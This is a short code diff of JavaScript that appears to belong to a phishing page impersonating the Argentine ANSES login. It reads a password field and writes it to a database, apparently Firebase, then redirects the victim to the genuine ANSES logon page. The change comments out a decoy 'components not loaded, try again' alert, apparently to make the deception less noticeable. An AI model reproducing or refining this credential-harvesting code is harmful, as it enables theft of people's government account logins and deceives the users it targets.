@@ -27,7 +27,7 @@ var contraseña= document.getElementById('contraseña').value;
 .then(function(docRef) {
     console.log("Document written with ID: ", docRef.id);
  
-  window.alert("No se han cargado todos los componentes de la pagina. Vuelva a intentarlo");
+ // window.alert("No se han cargado todos los componentes de la pagina. Vuelva a intentarlo");
 
     window.location.replace("https://servicioscorp.anses.gob.ar/clavelogon/logon.aspx?system=mianses");
 })
